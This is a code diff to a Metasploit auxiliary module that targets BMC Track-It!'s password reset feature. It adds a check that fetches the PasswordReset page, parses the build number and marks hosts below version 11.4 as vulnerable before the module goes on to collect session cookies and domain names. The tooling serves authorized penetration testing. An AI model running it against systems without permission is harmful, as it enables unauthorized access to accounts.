@@ -43,18 +43,63 @@ class Metasploit4 < Msf::Auxiliary
     datastore['LOCALUSER']
   end
 
-  def run_host(_ip)
+
+  def get_password_reset
+    send_request_cgi('uri' => normalize_uri(target_uri.path, 'PasswordReset'))
+  end
+
+  def is_track_it?(res)
+    res.body =~ /<title>Track-It! Password Reset/i
+  end
+
+  def extract_track_it_version(res)
+    res.body.scan(/\bBuild=([\d\.]+)/).flatten.first
+  end
+
+  def check_host(ip)
+    vprint_status("#{peer}: retrieving PasswordReset page to extract Track-It! version")
+
+    unless res = get_password_reset
+      print_error("#{peer}: Could not contact server")
+    end
+
+    if is_track_it?(res)
+      version = extract_track_it_version(res)
+      if version
+        fix_version = '11.4'
+        if Gem::Version.new(version) < Gem::Version.new(fix_version)
+          report_vuln(
+            :host => ip,
+            :port => rport,
+            :name => self.name,
+            :refs => self.references
+          )
+          vprint_status("#{peer}: Track-It! version #{version} is less than #{fix_version}")
+          return Exploit::CheckCode::Vulnerable
+        else
+          vprint_status("#{peer}: Track-It! version #{version} is not less than #{fix_version}")
+          return Exploit::CheckCode::Safe
+        end
+      else
+        vprint_error("#{peer} unable to get Track-It! version")
+        return Exploit::CheckCode::Unknown
+      end
+    else
+      vprint_status("#{peer} does not appear to be running Track-It!")
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def run_host(ip)
+    return unless check_host(ip) == Exploit::CheckCode::Vulnerable
+
     if datastore['DOMAIN'].blank?
       vprint_status("#{peer}: retrieving session cookie and domain name")
     else
       vprint_status("#{peer}: retrieving domain name")
     end
 
-    res = send_request_cgi(
-      'uri' => normalize_uri(target_uri.path, 'PasswordReset')
-    )
-
-    unless res
+    unless res = get_password_reset
       print_error("#{peer}: Could not contact server")
       return
     end
